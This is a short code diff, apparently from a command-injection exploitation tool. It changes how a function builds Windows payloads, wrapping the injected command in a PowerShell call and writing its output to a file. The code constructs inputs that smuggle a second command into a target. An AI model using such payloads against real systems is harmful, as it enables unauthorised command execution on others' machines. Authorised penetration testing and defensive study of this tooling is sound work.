@@ -76,8 +76,9 @@ def cmd_execution(separator, cmd, OUTPUT_TEXTFILE):
   elif settings.TARGET_OS == "win":
     payload = (separator + " " +
               "for /f \"delims=\" %i in ('cmd /c \"" +
+              "powershell.exe -InputFormat none write-host (cmd /c \"" +
               cmd + 
-              "\"') do @set /p =%i " + " > " + OUTPUT_TEXTFILE + " <nul"
+              "\")\"') do @set /p =%i " + " > " + OUTPUT_TEXTFILE + " <nul"
               ) 
   else:
     payload = (separator +
